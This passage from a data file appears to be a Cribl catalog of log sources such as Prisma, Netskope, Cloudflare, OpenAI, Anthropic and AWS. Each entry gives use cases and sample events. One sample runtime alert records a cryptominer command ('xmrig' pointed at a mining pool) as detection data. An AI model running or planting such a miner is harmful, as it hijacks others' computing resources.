        sampleEvent: '<14>Jun 06 14:32:08 prisma-gw-us-east TRAFFIC,end,2049,2026/06/06 14:32:08,jperks@cribl.io,TRAFFIC,end,from-globalprotect,vsys1,trust,untrust,tunnel.1,ethernet1/1,Cortex-Logging,2026/06/06 14:32:08,574326,1,52341,443,0,0,0x400064,tcp,allow,15234,1534,13700,25,2026/06/06 14:32:01,7,office365-enterprise-access,0,730277,0x0,United States,United States,0,15,10,aged-out,0,0,0,0,,prisma-gw-us-east-01,from-policy,,,0,,0,,N/A,0,0,0,0,jperks@cribl.io,globalprotect-gateway-us-east'
      },
      {
        id: 'prisma-access-gp',
        name: 'Prisma Access GlobalProtect / ZTNA Logs',
        vendor: 'Palo Alto Networks',
        description: 'GlobalProtect gateway and portal authentication logs, ZTNA connection events, HIP (Host Information Profile) check results, and tunnel lifecycle events from Prisma Access. Captures remote user VPN connections, device posture assessments, certificate validations, and explicit proxy connections for zero trust network access.',
        status: 'available',
        useCases: ['VPN Authentication Monitoring', 'Device Posture Compliance', 'ZTNA Policy Enforcement', 'Connection Failure Troubleshooting', 'Split-Tunnel Visibility', 'Certificate Expiry Detection', 'User Mobility Tracking', 'Gateway Health Monitoring', 'Concurrent Session Abuse'],
        personas: ['Security Engineering', 'NOC', 'Identity Team', 'Platform Engineering', 'SOC', 'Help Desk'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor GlobalProtect gateway health and tunnel establishment success rates to maintain 99.9% VPN availability SLA' },
            { persona: 'Data End User / Analyst', job: 'Troubleshoot connection failures by correlating HIP check results, certificate status, and client OS versions within 5 minutes' },
            { persona: 'Jack of All Trades', job: 'Track user mobility patterns across gateways to identify split-tunnel misconfigurations and suboptimal routing' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detection rules for concurrent VPN sessions from impossible locations, failed HIP posture checks, and certificate anomalies' },
            { persona: 'Data End User / Analyst', job: 'Identify compromised credentials by detecting VPN authentication from new geolocations not matching user travel patterns' },
            { persona: 'Jack of All Trades', job: 'Detect device posture compliance drift by correlating HIP check failures with endpoint security tool status' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete VPN authentication audit trail with device posture evidence for SOC2 access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Report on ZTNA policy enforcement gaps showing users bypassing posture requirements via exception policies' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Ingest GlobalProtect authentication and HIP logs via Cortex Data Lake API with user identity enrichment within 45 minutes' },
            { persona: 'Data Engineer', job: 'Correlate GlobalProtect connection events with Prisma Access traffic logs to build complete remote user session timelines' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Cortex Data Lake (HTTPS API) / Syslog (GlobalProtect system logs) / HTTPS Log Streaming',
        logFormat: 'Structured syslog or JSON. Key fields: virtual_system, event_type (gp-auth, gp-connect, gp-disconnect, hip-match), user, source_ip, gateway, portal, hip_match_type, client_os, client_version, tunnel_type.',
        avgEPS: '1,000-20,000 EPS depending on remote user population',
        sampleEvent: '{"log_type":"globalprotect","event_type":"gp-auth-success","receive_time":"2026-06-06T14:32:08.000Z","serial":"prisma-gw-us-east","user":"jperks@cribl.io","source_ip":"203.0.113.42","gateway":"prisma-gw-us-east-01","portal":"portal.prismaaccess.com","client_os":"Windows 10.0.26200","client_version":"6.3.1","tunnel_type":"IPSec","auth_method":"SAML-Okta","hip_match":"corporate-managed-device","device_name":"LAPTOP-JP01","connection_duration":0,"bytes_sent":0,"bytes_received":0}'
      },
      {
        id: 'netskope',
        name: 'Netskope Cloud Activity & Alert Logs',
        vendor: 'Netskope',
        description: 'Cloud-native SASE platform logs covering web transactions, CASB activity, DLP violations, threat protection events, private access connections, and user behavior analytics. Delivered via REST API or Cloud Log Shipper.',
        status: 'available',
        useCases: ['Cloud DLP', 'Shadow IT Discovery', 'Threat Protection', 'CASB Policy Enforcement', 'Zero Trust Access', 'User Risk Scoring', 'Data Exfiltration Detection'],
        personas: ['Cloud Security', 'SOC', 'Security Engineering', 'Compliance', 'Data Protection'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for anomalous cloud app usage, DLP policy violations, and malware downloads across SaaS applications' },
            { persona: 'Data End User / Analyst', job: 'Investigate shadow IT usage patterns and identify unsanctioned cloud storage sharing sensitive data' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress high-volume benign web transaction logs while preserving all alerts, DLP events, and threat detections for SIEM routing' },
            { persona: 'Data Engineer', job: 'Route Netskope alerts and DLP matches to SIEM while sending page visits and application activity to Lake for behavioral analysis' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of DLP violations and cloud sharing events for regulatory compliance reporting' },
            { persona: 'Data End User / Analyst', job: 'Generate reports on data exposure risk by application, user, and sensitivity classification' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Netskope Cloud Log Shipper integration and parse JSON events for multi-destination routing within 1 hour' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (Cloud Log Shipper) / Syslog / Cloud-to-Cloud connector',
        logFormat: 'JSON — fields include timestamp, user, src_location, dst_location, app, activity, object, alert_type, dlp_profile, severity, risk_level, category, ccl, cci, url, bytes_uploaded, bytes_downloaded, traffic_type.',
        avgEPS: '1,000-50,000 EPS depending on user count and inline vs API deployment',
        sampleEvent: '{"timestamp":"2026-06-11T14:32:08Z","type":"page","user":"jperks@cribl.io","src_ip":"203.0.113.42","src_country":"US","dst_country":"US","app":"Microsoft OneDrive","category":"Cloud Storage","ccl":"excellent","activity":"Upload","object":"roadmap-2026.xlsx","bytes_uploaded":85000000,"severity":"low","alert":"no","dlp_profile":"","policy":"Allow Cloud Storage","traffic_type":"CloudApp"}'
      },
      {
        id: 'cloudflare',
        name: 'Cloudflare HTTP & Firewall Logs',
        vendor: 'Cloudflare',
        description: 'Edge network logs from Cloudflare covering HTTP requests, WAF events, bot management decisions, DDoS mitigation, DNS queries, and Zero Trust access. Delivered via Logpush to cloud storage or HTTP endpoint.',
        status: 'available',
        useCases: ['DDoS Mitigation', 'WAF Monitoring', 'Bot Management', 'DNS Security', 'Performance Monitoring', 'Zero Trust Access', 'CDN Analytics'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'NOC', 'DevOps'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for WAF bypass attempts, credential stuffing, API abuse, and DDoS attack patterns from Cloudflare edge logs' },
            { persona: 'Data End User / Analyst', job: 'Analyze bot traffic patterns and WAF rule effectiveness to tune protection policies' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor origin server health, cache hit ratios, and edge latency to optimize CDN configuration' },
            { persona: 'Data End User / Analyst', job: 'Track request rates, error ratios, and bandwidth by zone to detect performance degradation' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter Cloudflare logs to route only security events (WAF blocks, challenges, bot detections) to SIEM while sending full request logs to Lake' },
            { persona: 'Data Engineer', job: 'Reduce SIEM ingest cost by 70% by suppressing 200-status cached requests and retaining only actionable security and error events' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Cloudflare Logpush to S3/GCS and set up Cribl Stream pull to parse and route within 45 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Elastic Security', 'Datadog', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Logpush (S3/GCS/Azure Blob/HTTP endpoint) / REST API',
        logFormat: 'JSON (NDJSON) — fields include ClientIP, ClientRequestHost, ClientRequestURI, EdgeResponseStatus, WAFAction, WAFRuleID, BotScore, BotManagementDecision, CacheCacheStatus, EdgeStartTimestamp, OriginResponseTime.',
        avgEPS: '10,000-1,000,000+ EPS depending on traffic volume and log types enabled',
        sampleEvent: '{"ClientIP":"203.0.113.42","ClientRequestHost":"app.example.com","ClientRequestMethod":"GET","ClientRequestURI":"/api/users","EdgeResponseStatus":200,"EdgeStartTimestamp":"2026-06-11T14:32:08Z","CacheCacheStatus":"hit","WAFAction":"allow","WAFRuleID":"","BotScore":2,"BotManagementDecision":"allow","OriginResponseTime":45000,"EdgeEndTimestamp":"2026-06-11T14:32:08.045Z"}'
      }
    ]
  },
  {
    category: 'AI / LLM',
    icon: '🤖',
    sources: [
      {
        id: 'openai-usage',
        name: 'OpenAI API Usage Logs',
        vendor: 'OpenAI',
        description: 'API usage and audit logs from OpenAI platform capturing model invocations, token consumption, API key usage, rate limit events, content filter triggers, fine-tuning jobs, file uploads, and assistant/thread interactions. Delivered via the OpenAI Usage API, Organization Audit Logs, and real-time usage dashboard exports.',
        status: 'available',
        useCases: ['Prompt Injection Detection', 'Data Leakage via Prompts', 'Token Cost Optimization', 'Rate Limit Monitoring', 'Content Policy Violations', 'Shadow AI Usage', 'Model Performance Tracking', 'API Key Abuse', 'Fine-Tuning Governance', 'Usage Allocation by Team'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'Data Protection', 'FinOps', 'AI/ML Team', 'Compliance'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Reduce OpenAI API log volume by 50-65% by aggregating repetitive health-check and ping requests into hourly summaries' },
            { persona: 'Data Engineer', job: 'Route token usage metrics to FinOps dashboards while sending only content filter triggers and anomalous requests to SIEM' },
            { persona: 'Team Leader', job: 'Produce monthly cost-per-model reports showing token spend by team and identify optimization targets saving 20%+ on API costs' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 5+ detection rules for prompt injection patterns, API key abuse, and shadow AI usage from unauthorized IP ranges' },
            { persona: 'Data End User / Analyst', job: 'Investigate content filter triggers by correlating user identity, model, and prompt metadata to identify policy violations within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Detect API key compromise by identifying usage spikes exceeding 3x baseline or requests from new geographic locations' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all AI model invocations with user attribution for 12+ months to satisfy AI governance requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate AI usage compliance reports showing content policy violations and data classification breaches by department within 15 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor API latency p95/p99 and rate limit events per model to detect capacity degradation within 2-minute windows' },
            { persona: 'Jack of All Trades', job: 'Track model usage distribution and token consumption trends to forecast budget impact of new AI feature rollouts' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'OpenAI Organization Audit Log API (Cribl REST Collector) / Usage API polling / Webhook integration / API gateway proxy logs (capturing request/response metadata)',
        logFormat: 'JSON. Key fields: id, type (api_request, content_filter, rate_limit, fine_tune), timestamp, organization_id, project_id, api_key_id, model, endpoint, tokens_input, tokens_output, tokens_total, user, ip_address, status_code, content_filter_results, latency_ms.',
        avgEPS: '100-50,000 EPS depending on API call volume and logging granularity',
        sampleEvent: '{"id":"req-abc123","type":"api_request","timestamp":"2026-06-06T14:32:08.000Z","organization_id":"org-xyz789","project_id":"proj-456","api_key_id":"sk-...abc","api_key_name":"production-backend","model":"gpt-4o","endpoint":"/v1/chat/completions","tokens_input":1250,"tokens_output":847,"tokens_total":2097,"user":"svc-chatbot@cribl.io","ip_address":"10.1.2.50","status_code":200,"latency_ms":2340,"content_filter_results":{"sexual":false,"violence":false,"self_harm":false,"hate":false},"cost_usd":0.0157}'
      },
      {
        id: 'openai-compliance',
        name: 'OpenAI Compliance / Trust Logs',
        vendor: 'OpenAI',
        description: 'Compliance and governance logs from OpenAI capturing data retention events, content moderation decisions, PII detection in prompts/completions, model abuse indicators, safety system activations, organization policy enforcement, and data processing records for regulatory compliance (SOC2, GDPR). Includes ChatGPT Enterprise and API compliance events.',
        status: 'available',
        useCases: ['PII Leakage Detection', 'Regulatory Compliance (GDPR/SOC2)', 'Content Policy Enforcement', 'Data Retention Governance', 'Model Abuse Detection', 'Conversation Logging for Audit', 'Sensitive Topic Monitoring', 'Employee AI Usage Compliance', 'Third-Party Data Exposure', 'Prompt/Completion Archival'],
        personas: ['Compliance', 'Data Protection', 'Security Engineering', 'SOC', 'Legal', 'Privacy Team', 'AI Governance'],
        jobsToBeDone: [
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Enforce 100% PII detection coverage across all AI conversations with automated redaction before storage in compliance archive' },
            { persona: 'Data End User / Analyst', job: 'Generate GDPR/SOC2 compliance reports showing data retention actions, PII exposure incidents, and remediation timelines within 30 minutes' },
            { persona: 'Team Leader', job: 'Demonstrate AI governance maturity to auditors with complete policy violation tracking and resolution metrics per quarter' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for PII leakage in prompts, sensitive topic policy violations, and unauthorized data classification exposure' },
            { persona: 'Data End User / Analyst', job: 'Investigate model abuse indicators by tracing conversation histories with safety system activations to identify insider threats' },
            { persona: 'Jack of All Trades', job: 'Detect third-party data exposure by correlating prompt content classification with organizational data handling policies' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress high-volume compliance heartbeat events and retain only policy-relevant records, reducing storage by 40-55%' },
            { persona: 'Data Engineer', job: 'Route PII detection alerts and policy violations to SIEM in real time while batching routine compliance metadata to Lake for long-term audit' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure REST Collector polling for OpenAI Compliance API with pagination handling and deduplication within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize OpenAI compliance events across ChatGPT Enterprise and API channels into unified AI governance schema for cross-platform reporting' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3', 'CrowdStrike NG SIEM'],
        collectionMethod: 'OpenAI Compliance API (Cribl REST Collector) / ChatGPT Enterprise Admin Audit Export / Data Export API / DLP integration proxy',
        logFormat: 'JSON. Key fields: event_id, event_type (conversation, moderation, retention, policy_violation), timestamp, user_id, user_email, organization_id, model, conversation_id, pii_detected, pii_types[], content_filter_triggered, policy_name, retention_action, data_classification.',
        avgEPS: '50-10,000 EPS depending on user population and compliance logging level',
        sampleEvent: '{"event_id":"evt-comp-12345","event_type":"policy_violation","timestamp":"2026-06-06T14:32:08.000Z","organization_id":"org-xyz789","user_id":"user-abc","user_email":"jperks@cribl.io","model":"gpt-4o","conversation_id":"conv-456","policy_name":"No-PII-in-Prompts","violation_details":{"pii_detected":true,"pii_types":["credit_card","ssn"],"prompt_snippet":"...customer SSN is 123-45-...","action_taken":"blocked","severity":"high"},"data_classification":"confidential","retention_status":"redacted"}'
      },
      {
        id: 'anthropic-compliance',
        name: 'Anthropic Usage & Compliance Logs',
        vendor: 'Anthropic',
        description: 'API usage, safety, and compliance logs from the Anthropic platform (Claude API). Captures model invocations, token consumption, content moderation triggers, safety classifier activations, usage limits, API key lifecycle events, and compliance-relevant metadata for audit trails. Supports enterprise governance requirements including data handling verification and responsible AI monitoring.',
        status: 'available',
        useCases: ['Prompt Injection Detection', 'Sensitive Data in Prompts', 'Token Cost Optimization', 'Safety Classifier Monitoring', 'API Key Governance', 'Rate Limit Tracking', 'Shadow AI Detection', 'Responsible AI Compliance', 'Usage Allocation by Workspace', 'Content Policy Enforcement'],
        personas: ['Security Engineering', 'Compliance', 'Platform Engineering', 'Data Protection', 'FinOps', 'AI/ML Team', 'SOC'],
        jobsToBeDone: [
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Aggregate Claude API request logs by workspace and model into hourly cost summaries, reducing raw log volume by 55-70%' },
            { persona: 'Data Engineer', job: 'Route safety triggers and anomalous usage to SIEM while sending token-level billing metrics to FinOps platforms at lower cost' },
            { persona: 'Team Leader', job: 'Deliver weekly cost-per-workspace reports with model-level breakdowns identifying teams exceeding allocated AI budgets by 15%+' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain immutable audit trail of all Claude API invocations with workspace attribution for responsible AI governance requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate safety classifier activation reports showing frequency, severity, and resolution status by use case for quarterly AI ethics review' },
            { persona: 'Jack of All Trades', job: 'Detect shadow AI usage by identifying API calls from unregistered IP addresses or unauthorized service accounts within 5 minutes' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 5+ detection rules for prompt injection attempts, sensitive data exfiltration via completions, and API key abuse patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate safety trigger events by correlating request metadata with user identity and workspace context to assess intent' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Claude API latency percentiles and rate limit utilization per workspace to prevent service degradation before user impact' },
            { persona: 'Data End User / Analyst', job: 'Track model adoption trends and stop_reason distributions to identify integration issues and optimize prompt engineering efforts' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Anthropic Admin API (Cribl REST Collector) / Usage API polling / Webhook notifications / API gateway proxy logs',
        logFormat: 'JSON. Key fields: id, type (api_request, safety_trigger, rate_limit, compliance_event), timestamp, organization_id, workspace_id, api_key_id, model, input_tokens, output_tokens, stop_reason, user_id, ip_address, safety_categories, latency_ms, cost_usd.',
        avgEPS: '50-20,000 EPS depending on API volume and logging verbosity',
        sampleEvent: '{"id":"req-ant-789","type":"api_request","timestamp":"2026-06-06T14:32:08.000Z","organization_id":"org-cribl-123","workspace_id":"ws-prod","api_key_id":"sk-ant-...xyz","api_key_name":"cse-automation","model":"claude-sonnet-4-6-20250514","input_tokens":2100,"output_tokens":1450,"stop_reason":"end_turn","user_id":"svc-assistant@cribl.io","ip_address":"10.1.2.50","status_code":200,"latency_ms":3200,"safety_triggered":false,"cost_usd":0.0234,"metadata":{"use_case":"customer-facing-bot","department":"customer-success"}}'
      }
    ]
  },
  {
    category: 'Cloud',
    icon: '☁️',
    sources: [
      {
        id: 'prisma-cloud-cspm',
        name: 'Prisma Cloud CSPM / CIEM Alerts',
        vendor: 'Palo Alto Networks',
        description: 'Cloud Security Posture Management (CSPM) and Cloud Infrastructure Entitlement Management (CIEM) alerts from Prisma Cloud. Captures misconfiguration findings, compliance violations, IAM excessive permissions, network exposure risks, and anomalous cloud API activity across AWS, Azure, and GCP. Events include alert severity, policy details, resource metadata, and remediation guidance.',
        status: 'available',
        useCases: ['Cloud Misconfiguration Detection', 'Compliance Monitoring (CIS/SOC2/PCI)', 'Excessive IAM Permissions', 'Public Exposure Detection', 'Anomalous API Activity', 'Drift Detection', 'Multi-Cloud Governance', 'Attack Path Analysis', 'Identity Threat Detection'],
        personas: ['Cloud Security', 'Security Engineering', 'Compliance', 'DevOps', 'Platform Engineering', 'SOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for publicly exposed resources, excessive IAM permissions, and configuration drift from approved baselines' },
            { persona: 'Data End User / Analyst', job: 'Investigate attack path analysis alerts by correlating CSPM misconfigurations with network exposure and IAM entitlement chains' },
            { persona: 'Jack of All Trades', job: 'Detect anomalous cloud API activity patterns indicating credential compromise across AWS, Azure, and GCP within 10 minutes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain continuous CIS/SOC2/PCI compliance posture scoring with automated drift alerts when benchmarks drop below 95%' },
            { persona: 'Data End User / Analyst', job: 'Generate multi-cloud compliance reports by framework (CIS, PCI, SOC2) showing violation trends and remediation velocity per account' },
            { persona: 'Team Leader', job: 'Present executive compliance dashboards showing posture improvement over 90-day windows with clear risk reduction metrics' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate recurring CSPM alerts for known-accepted risks and suppress informational findings, reducing SIEM alert volume by 45-60%' },
            { persona: 'Data Engineer', job: 'Route critical/high severity CSPM alerts to SIEM in real time while batching medium/low findings to Lake for trend analysis' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor cloud resource inventory drift and detect unauthorized infrastructure provisioning across 500+ accounts within 15 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track IAM permission sprawl trends by identifying service accounts with unused privileges exceeding 90-day inactivity thresholds' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Prisma Cloud Alert API (Cribl REST Collector polling) / Webhook Integration (HTTPS POST) / Amazon SQS / Splunk Integration',
        logFormat: 'JSON alert objects. Key fields: alertId, status, policy.name, policy.severity, policy.complianceMetadata, resource.cloudType, resource.resourceType, resource.name, resource.region, resource.account, riskDetail, remediationCli.',
        avgEPS: '500-10,000 EPS depending on cloud footprint and policy count',
        sampleEvent: '{"id":"A-12345678","status":"open","alertTime":"2026-06-06T14:32:08Z","policy":{"policyId":"pol-abc123","name":"S3 Bucket is publicly accessible","severity":"high","policyType":"config","complianceMetadata":[{"standardName":"CIS AWS Benchmark","requirementId":"2.1.5"}]},"resource":{"rrn":"rrn:aws:s3:us-east-1:123456789012:bucket/sensitive-data-bucket","cloudType":"aws","resourceType":"aws_s3_bucket","name":"sensitive-data-bucket","region":"us-east-1","account":"Production (123456789012)"},"riskDetail":{"riskScore":85,"reason":"Bucket allows public read access and contains sensitive data patterns"},"alertRules":[{"name":"Production Critical Assets"}]}'
      },
      {
        id: 'prisma-cloud-cwp',
        name: 'Prisma Cloud Compute (CWP) Runtime Events',
        vendor: 'Palo Alto Networks',
        description: 'Cloud Workload Protection (CWP) runtime security events from Prisma Cloud Compute (formerly Twistlock). Captures container runtime anomalies, host security events, vulnerability scan results, compliance check outcomes, web application firewall (WAAS) events, and serverless function alerts. Defenders report process execution, network connections, file system changes, and image vulnerability assessments.',
        status: 'available',
        useCases: ['Container Escape Detection', 'Cryptominer Detection', 'Runtime Process Anomalies', 'Vulnerability Prioritization', 'Image Compliance', 'Kubernetes Admission Control', 'Serverless Injection', 'WAAS Attack Blocking', 'Host Integrity Monitoring'],
        personas: ['Cloud Security', 'Security Engineering', 'Platform Engineering', 'DevOps', 'SOC', 'Container Team'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for container escape attempts, cryptominer execution, and runtime process anomalies with MITRE ATT&CK mapping' },
            { persona: 'Data End User / Analyst', job: 'Investigate container runtime alerts by correlating process execution with image vulnerability data and Kubernetes admission decisions' },
            { persona: 'Jack of All Trades', job: 'Detect lateral movement within Kubernetes clusters by identifying unexpected network connections between namespaces and pods' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Defender agent health across container fleet and detect coverage gaps exceeding 5% of running workloads within 10 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track vulnerability scan results by severity and image to prioritize patching efforts for critical CVEs in production namespaces' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine vulnerability scan results and compliance check passes, reducing CWP event volume by 50-65% for SIEM destinations' },
            { persona: 'Data Engineer', job: 'Route runtime security alerts and incidents to SIEM while sending vulnerability and compliance data to Lake for trend reporting' },
            { persona: 'Team Leader', job: 'Quantify container security log optimization savings by comparing per-cluster ingestion costs before and after Cribl routing' }
          ]},
          { category: 'Platform Operations', jobs: [
            { persona: 'Platform Administrator', job: 'Scale CWP event collection to handle 200+ clusters with zero event loss during deployment surges and auto-scaling events' },
            { persona: 'Data Onboarder', job: 'Deploy Prisma Cloud Compute API collection with webhook failover and deduplication across multi-region deployments within 1 hour' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Prisma Cloud Compute API (Cribl REST Collector) / Webhook Alerts / Syslog (CEF) / Cortex XSIAM integration',
        logFormat: 'JSON. Types: runtime audit (process/network/filesystem), vulnerability scan, compliance check, WAAS event, incident. Key fields: type, hostname, imageName, containerName, namespace, cluster, rule, effect, msg, forensics.',
        avgEPS: '2,000-50,000 EPS depending on container fleet size and defender count',
        sampleEvent: '{"type":"containerRuntime","time":"2026-06-06T14:32:08Z","hostname":"k8s-worker-03","imageName":"registry.example.com/api-service:v2.1.4","containerName":"api-service-7b4f8c6d9-xk2mz","namespace":"production","cluster":"prod-east-1","rule":"Default - alert on suspicious processes","effect":"alert","msg":"Unexpected process launched: /tmp/xmrig","processPath":"/tmp/xmrig","processMD5":"a1b2c3d4e5f6789012345678","user":"root","pid":4521,"interactive":false,"forensics":{"command":"./xmrig -o pool.mining.com:3333 -u wallet123","parentProcess":"/bin/sh","parentPid":4520}}'
      },
      {
        id: 'aws-vpc-flow',
        name: 'AWS VPC Flow Logs',
        vendor: 'Amazon Web Services',
        description: 'Network flow records from AWS VPCs capturing accepted and rejected traffic at the ENI level. Includes source/destination IPs, ports, protocol, action (ACCEPT/REJECT), bytes, packets, tcp-flags, and flow direction.',
        status: 'available',
        useCases: ['Lateral Movement', 'Exposed Services', 'Suspicious Egress', 'Port Scanning Detection', 'Network Troubleshooting', 'Traffic Imbalance', 'Service Dependency Mapping', 'NAT Gateway Monitoring', 'Cross-AZ Traffic Analysis'],
        personas: ['Security Engineering', 'Cloud Security', 'SRE', 'Platform Engineering', 'NOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for lateral movement, port scanning, and suspicious egress to known-bad IPs using VPC flow action fields' },
            { persona: 'Data End User / Analyst', job: 'Investigate rejected traffic patterns to identify exposed services and unauthorized access attempts across VPC boundaries' },
            { persona: 'Jack of All Trades', job: 'Detect data exfiltration by flagging outbound flows exceeding 1GB to non-approved external IPs within 15-minute windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Aggregate VPC flow logs into 5-minute summaries for accepted traffic while preserving per-flow detail for rejects, reducing volume by 70-85%' },
            { persona: 'Data Engineer', job: 'Route rejected flows and high-volume anomalies to SIEM while sending accepted flow summaries to Lake for network capacity planning' },
            { persona: 'Team Leader', job: 'Demonstrate VPC flow log cost reduction from raw S3 storage to optimized routing with maintained security detection coverage' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor cross-AZ traffic patterns and NAT gateway utilization to detect routing anomalies and optimize network architecture costs' },
            { persona: 'Data End User / Analyst', job: 'Map service dependencies using flow records to validate security group rules and identify unnecessary network exposure' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure S3 Collector for VPC flow log ingestion with automatic partition discovery and parsing within 30 minutes' },
            { persona: 'Platform Administrator', job: 'Scale VPC flow collection across 100+ accounts using centralized S3 delivery with cross-account IAM role federation' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'S3 (VPC publishes to S3 bucket) / CloudWatch Logs / Kinesis Data Firehose',
        sampleEvent: '2 123456789012 eni-0a1b2c3d4e5f6g7h8 10.0.1.25 52.94.76.89 49152 443 6 15 12000 1717680000 1717680060 ACCEPT OK'
      },
      {
        id: 'o365-activity',
        name: 'Microsoft 365 Unified Audit Log',
        vendor: 'Microsoft',
        description: 'Microsoft 365 Unified Audit Log capturing user and admin activity across Exchange Online, SharePoint Online, OneDrive, Teams, Azure AD, Power Platform, and Microsoft Defender. Events include mailbox access, file sharing, permission changes, DLP policy matches, eDiscovery actions, and admin configuration changes delivered via the Management Activity API.',
        status: 'available',
        useCases: ['Business Email Compromise', 'Data Exfiltration via SharePoint/OneDrive', 'Mailbox Delegation Abuse', 'Insider Threat Detection', 'eDiscovery Abuse', 'OAuth App Consent Attacks', 'External Sharing Monitoring', 'Admin Role Changes', 'DLP Policy Violations', 'Teams Guest Access Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Compliance', 'Incident Response', 'Identity Team', 'Data Protection', 'M365 Administration'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 10+ detection rules for BEC indicators, mailbox delegation abuse, OAuth consent attacks, and mass file download patterns' },
